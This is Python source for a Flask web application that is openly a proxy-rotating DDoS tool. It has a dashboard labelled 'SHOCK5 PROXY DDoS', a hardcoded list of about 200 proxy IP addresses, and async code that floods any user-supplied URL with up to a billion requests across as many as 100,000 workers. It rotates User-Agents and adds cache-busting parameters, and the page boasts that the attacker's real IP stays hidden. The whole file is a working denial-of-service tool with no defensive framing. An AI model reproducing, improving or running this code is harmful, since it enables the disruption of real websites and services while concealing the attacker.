import asyncio
import aiohttp
import random
import time
import json
from flask import Flask, render_template_string, request, jsonify
from flask_cors import CORS
from threading import Thread

app = Flask(__name__)
CORS(app)

# Attack state
attack_active = False
attack_stats = {
    'total': 0,
    'success': 0,
    'failed': 0,
    'start_time': None,
    'proxy_count': 0
}
target_url = ""
thread_count = 50000
current_proxy_index = 0

# SHOCK5 PROXY LIST - All working proxies
PROXY_LIST = [
    "72.195.34.42:4145", "184.170.248.5:4145", "192.252.210.233:4145", "193.25.215.182:22222",
    "192.252.216.81:4145", "66.42.224.229:41679", "174.64.199.79:4145", "84.47.150.125:1080",
    "184.181.217.206:4145", "198.8.94.174:39078", "185.218.137.242:1080", "192.252.214.20:15864",
    "142.54.235.9:4145", "45.194.33.12:30001", "144.124.232.204:443", "98.190.239.3:4145",
    "51.79.177.162:1010", "2.26.133.86:1080", "129.153.194.16:1080", "192.111.134.10:4145",
    "142.54.236.97:4145", "142.54.232.6:4145", "206.220.175.2:4145", "158.180.77.24:1080",
    "67.201.39.14:4145", "5.255.99.75:1080", "23.176.40.194:1080", "192.252.215.5:16137",
    "199.102.105.242:4145", "68.71.247.130:4145", "72.195.101.99:4145", "2.26.87.216:1080",
    "5.255.123.162:1080", "68.71.240.210:4145", "199.102.104.70:4145", "88.204.142.108:1080",
    "98.170.57.249:4145", "193.221.203.192:1080", "142.54.228.193:4145", "192.111.138.29:4145",
    "144.31.192.13:1080", "149.62.186.244:1080", "194.233.68.54:1088", "72.195.34.58:4145",
    "152.32.230.12:7890", "43.106.21.170:1080", "144.31.225.3:1080", "192.252.208.67:14287",
    "162.253.68.97:4145", "68.71.252.38:4145", "199.58.185.9:4145", "68.71.245.206:4145",
    "68.71.249.153:48606", "72.195.34.41:4145", "5.255.103.55:1080", "72.214.108.67:4145",
    "46.62.214.3:1080", "68.1.210.189:4145", "184.181.217.213:4145", "43.161.217.219:1080",
    "23.175.248.21:1080", "8.210.54.203:1080", "5.255.113.177:1080", "103.231.12.249:1080",
    "142.54.237.34:4145", "67.201.33.10:25283", "192.111.137.35:4145", "98.170.57.241:4145",
    "74.119.144.60:4145", "72.205.0.93:4145", "86.107.168.166:22", "192.252.220.89:4145",
    "199.102.106.94:4145", "72.195.114.169:4145", "47.236.53.35:1145", "134.122.64.174:1080",
    "82.114.228.67:1080", "68.71.251.134:4145", "174.75.211.222:4145", "68.71.242.118:4145",
    "24.249.199.12:4145", "68.71.241.33:4145", "184.181.217.220:4145", "152.53.144.223:1080",
    "192.111.130.2:4145", "167.71.32.51:1080", "104.37.135.145:4145", "47.237.116.215:1080",
    "142.54.237.38:4145", "184.178.172.14:4145", "185.234.66.87:1082", "184.178.172.13:15311",
    "198.8.84.3:4145", "174.75.211.193:4145", "184.178.172.28:15294", "98.175.31.222:4145",
    "47.79.79.35:10808", "152.70.57.143:1080", "216.36.108.151:1080", "192.252.214.17:4145",
    "103.75.118.84:1080", "184.178.172.18:15280", "199.116.114.11:4145", "94.228.118.127:1414",
    "162.240.96.211:1080", "98.191.0.47:4145", "104.200.152.30:4145", "154.219.125.240:58367",
    "203.25.208.163:1011", "176.109.104.211:8888", "184.178.172.26:4145", "199.116.112.6:4145",
    "138.124.61.124:1080", "170.106.111.221:1080", "38.147.187.19:1100", "170.64.170.204:1080",
    "174.77.111.196:4145", "98.188.47.132:4145", "72.195.34.59:4145", "130.61.119.46:3128",
    "68.71.249.158:4145", "184.178.172.25:15291", "45.61.188.134:44499", "185.234.66.87:1081",
    "165.154.227.13:1080", "199.229.254.129:4145", "47.83.168.191:4000", "192.111.139.163:19404",
    "192.252.211.193:4145", "213.165.38.234:1081", "192.111.135.17:18302", "70.166.167.38:57728",
    "174.64.199.82:4145", "192.111.137.37:18762", "72.49.49.11:31034", "192.111.139.165:4145",
    "72.223.188.92:4145", "198.8.94.170:4145", "5.255.117.250:1080", "192.252.208.70:14282",
    "68.71.254.6:4145", "192.111.129.145:16894", "192.111.130.5:17002", "72.37.216.68:4145",
    "98.178.72.30:4145", "72.195.114.184:4145", "72.207.113.97:4145", "208.102.51.6:58208",
    "72.56.107.177:1080", "67.201.58.190:4145", "94.158.244.245:1080", "185.125.171.171:1080",
    "192.111.129.150:4145", "107.181.161.81:4145", "199.187.210.54:4145", "107.152.98.5:4145",
    "106.52.215.138:7890", "212.58.132.5:1080", "77.232.142.77:31336", "158.160.82.208:1080",
    "159.54.148.142:1080", "184.182.240.12:4145", "142.54.226.214:4145", "184.178.172.17:4145",
    "98.182.171.161:4145", "184.170.245.148:4145", "192.252.216.86:4145", "203.25.208.163:1111",
    "213.121.165.12:1080", "142.54.231.38:4145", "144.124.227.90:21074", "185.125.201.149:7443"
]

def get_random_proxy():
    """Get random proxy from SHOCK5 list"""
    proxy_str = random.choice(PROXY_LIST)
    proxy_url = f"http://{proxy_str}"
    return proxy_url

# Glowing Dashboard HTML
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 SHOCK5 PROXY DDoS | REAL REQUESTS 🔥</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0a0a, #1a0030);
            font-family: 'Orbitron', monospace;
            min-height: 100vh;
            padding: 20px;
        }

        @keyframes shockGlow {
            0% { text-shadow: 0 0 5px #ff00ff, 0 0 10px #ff00ff; }
            100% { text-shadow: 0 0 30px #ff00ff, 0 0 50px #00ffff; }
        }

        @keyframes borderShock {
            0% { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
            50% { border-color: #00ffff; box-shadow: 0 0 40px #ff00ff; }
            100% { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
        }

        .container {
            max-width: 1500px;
            margin: 0 auto;
        }

        .header {
            border: 3px solid #ff00ff;
            padding: 30px;
            text-align: center;
            border-radius: 40px;
            margin-bottom: 30px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            animation: borderShock 1.5s infinite;
        }

        .title {
            font-size: 2.8em;
            font-weight: 900;
            animation: shockGlow 1s infinite alternate;
        }

        .shock5-badge {
            color: #00ffff;
            font-size: 1.2em;
            margin-top: 10px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            border: 2px solid #ff00ff;
            padding: 20px;
            text-align: center;
            background: rgba(0,0,0,0.9);
            border-radius: 20px;
            animation: borderShock 2s infinite;
        }

        .stat-value {
            font-size: 2.5em;
            font-weight: bold;
            color: #ff3366;
        }

        .input-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 30px;
        }

        input, select, button {
            background: #000;
            border: 2px solid #ff00ff;
            color: #00ffff;
            padding: 15px 20px;
            font-family: monospace;
            font-weight: bold;
            border-radius: 15px;
            font-size: 14px;
        }

        input {
            flex: 3;
        }

        button {
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            background: #ff00ff;
            color: #000;
            box-shadow: 0 0 30px #ff00ff;
            transform: scale(1.02);
        }

        .log-panel {
            border: 2px solid #ff00ff;
            height: 350px;
            overflow-y: auto;
            background: rgba(0,0,0,0.95);
            border-radius: 20px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .log-entry {
            border-left: 3px solid #ff00ff;
            padding: 8px 15px;
            margin: 8px 0;
            font-size: 12px;
        }

        .log-success {
            color: #00ffaa;
        }

        .log-proxy {
            color: #ffaa00;
        }

        .progress-bar {
            width: 100%;
            height: 30px;
            background: #1a001a;
            border: 2px solid #ff00ff;
            border-radius: 30px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            transition: width 0.05s;
        }

        .proxy-counter {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #000;
            border: 1px solid #ff00ff;
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 11px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="title">🔥 SHOCK5 PROXY DDoS 🔥</div>
        <div class="shock5-badge">⚡ REAL REQUESTS | 200+ PROXY ROTATION ⚡</div>
        <div style="color:#ff8888; margin-top:10px;">💀 EVERY REQUEST = DIFFERENT PROXY | REAL IP HIDDEN 💀</div>
    </div>

    <div class="stats">
        <div class="stat-card"><div>💥 TOTAL</div><div class="stat-value" id="total">0</div></div>
        <div class="stat-card"><div>✅ REAL HITS</div><div class="stat-value" id="success">0</div></div>
        <div class="stat-card"><div>⚡ REQ/SEC</div><div class="stat-value" id="rate">0</div></div>
        <div class="stat-card"><div>🔄 PROXIES</div><div class="stat-value" id="proxyCount">0</div></div>
        <div class="stat-card"><div>🎭 STATUS</div><div class="stat-value" id="status">READY</div></div>
    </div>

    <div class="input-group">
        <input type="text" id="targetUrl" placeholder="https://any-website.com OR https://server-op.in/api?num=1234567890" value="https://httpbin.org/get">
        <select id="threadSelect">
            <option value="10000">10K THREADS</option>
            <option value="25000">25K THREADS</option>
            <option value="50000" selected>50K THREADS</option>
            <option value="100000">100K THREADS (MAX)</option>
        </select>
        <button id="startBtn">🔥 START REAL ATTACK 🔥</button>
        <button id="stopBtn">⛔ STOP</button>
    </div>

    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    <div class="log-panel" id="logPanel">
        <div class="log-entry log-success">[SHOCK5] 200+ PROXIES LOADED - REAL REQUESTS READY</div>
        <div class="log-entry log-proxy">[PROXY] EACH REQUEST USES RANDOM PROXY FROM SHOCK5 LIST</div>
        <div class="log-entry log-success">[READY] ENTER URL AND START KILLING</div>
    </div>
</div>
<div class="proxy-counter" id="proxyDisplay">🔄 PROXY READY</div>

<script>
    let interval = null;
    
    async function updateStats() {
        try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            document.getElementById('total').innerText = data.total.toLocaleString();
            document.getElementById('success').innerText = data.success.toLocaleString();
            document.getElementById('rate').innerText = data.rate.toLocaleString();
            document.getElementById('proxyCount').innerText = data.proxy_count;
            let percent = Math.min(100, Math.floor((data.total / 1000000000) * 100));
            document.getElementById('progressFill').style.width = percent + '%';
            if(data.active) document.getElementById('status').innerHTML = '🔴 ATTACKING';
            else document.getElementById('status').innerHTML = '✅ READY';
        } catch(e) {}
    }
    
    function addLog(msg, type='success') {
        const logDiv = document.getElementById('logPanel');
        const entry = document.createElement('div');
        entry.className = `log-entry log-${type}`;
        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logDiv.appendChild(entry);
        entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        while(logDiv.children.length > 200) logDiv.removeChild(logDiv.children[0]);
    }
    
    function updateProxyDisplay() {
        const proxies = ['104.xxx', '184.xxx', '192.xxx', '68.xxx', '72.xxx', '45.xxx', '5.xxx', '142.xxx'];
        document.getElementById('proxyDisplay').innerHTML = `🔄 SHOCK5 PROXY: ${random.choice(proxies)}.xxx:4145`;
    }
    
    const random = (arr) => arr[Math.floor(Math.random() * arr.length)];
    setInterval(updateProxyDisplay, 1000);
    
    document.getElementById('startBtn').onclick = async () => {
        let target = document.getElementById('targetUrl').value.trim();
        const threads = parseInt(document.getElementById('threadSelect').value);
        if(!target) { alert('Enter target URL or API'); return; }
        if(!target.startsWith('http')) target = 'https://' + target;
        
        const res = await fetch('/api/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target: target, threads: threads })
        });
        const data = await res.json();
        addLog(data.message, 'success');
        if(interval) clearInterval(interval);
        interval = setInterval(updateStats, 300);
    };
    
    document.getElementById('stopBtn').onclick = async () => {
        const res = await fetch('/api/stop', { method: 'POST' });
        const data = await res.json();
        addLog(data.message, 'proxy');
        if(interval) { clearInterval(interval); interval = null; }
    };
    
    updateStats();
    setInterval(updateStats, 1000);
    addLog('[READY] SHOCK5 PROXY ENGINE ONLINE - REAL REQUESTS WILL BE SENT', 'success');
</script>
</body>
</html>
"""

async def send_with_proxy(session, url, worker_id, proxy_url):
    """Send real request through proxy"""
    global attack_stats
    if not attack_active:
        return False
    
    final_url = url + (('&' if '?' in url else '?') + f'reqid={hash(time.time())}_{worker_id}_{random.randint(1,999999)}')
    
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]),
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
    }
    
    try:
        async with session.get(final_url, headers=headers, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
            attack_stats['total'] += 1
            if resp.status < 500:
                attack_stats['success'] += 1
            else:
                attack_stats['failed'] += 1
            return resp.status < 500
    except Exception as e:
        attack_stats['total'] += 1
        attack_stats['failed'] += 1
        return False

async def proxy_worker(worker_id, url, requests_per_worker):
    """Worker that rotates proxies for each request"""
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        sent = 0
        while attack_active and sent < requests_per_worker:
            proxy = get_random_proxy()
            await send_with_proxy(session, url, worker_id, proxy)
            sent += 1
            if sent % 100 == 0:
                await asyncio.sleep(0)

async def proxy_attack(target, num_threads):
    global attack_active, attack_stats
    attack_active = True
    attack_stats = {
        'total': 0,
        'success': 0,
        'failed': 0,
        'start_time': time.time(),
        'proxy_count': len(PROXY_LIST)
    }
    
    REQUESTS_TARGET = 1000000000  # 1 Billion - Unlimited
    requests_per_worker = REQUESTS_TARGET // num_threads + 1
    
    tasks = []
    for i in range(num_threads):
        tasks.append(asyncio.create_task(proxy_worker(i, target, requests_per_worker)))
    
    await asyncio.gather(*tasks)
    attack_active = False

def run_proxy_attack(target, threads):
    asyncio.run(proxy_attack(target, threads))

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def stats():
    global attack_stats, attack_active
    rate = 0
    if attack_stats['start_time'] and attack_stats['total'] > 0:
        elapsed = time.time() - attack_stats['start_time']
        if elapsed > 0:
            rate = int(attack_stats['total'] / elapsed)
    return jsonify({
        'total': attack_stats['total'],
        'success': attack_stats['success'],
        'failed': attack_stats['failed'],
        'rate': rate,
        'proxy_count': attack_stats['proxy_count'],
        'active': attack_active
    })

@app.route('/api/start', methods=['POST'])
def start():
    global target_url, thread_count, attack_active, attack_thread
    if attack_active:
        return jsonify({'message': '⚠️ Attack already running! Stop first.'})
    
    data = request.json
    target_url = data.get('target', '').strip()
    thread_count = data.get('threads', 50000)
    
    if not target_url:
        return jsonify({'message': '❌ No target URL provided!'})
    
    attack_thread = Thread(target=run_proxy_attack, args=(target_url, thread_count))
    attack_thread.daemon = True
    attack_thread.start()
    
    return jsonify({'message': f'🔥 REAL ATTACK STARTED! Target: {target_url} | {thread_count} threads | {len(PROXY_LIST)} SHOCK5 proxies rotating 🔥'})

@app.route('/api/stop', methods=['POST'])
def stop():
    global attack_active
    attack_active = False
    return jsonify({'message': '⛔ Attack stopped! All proxies released ⛔'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
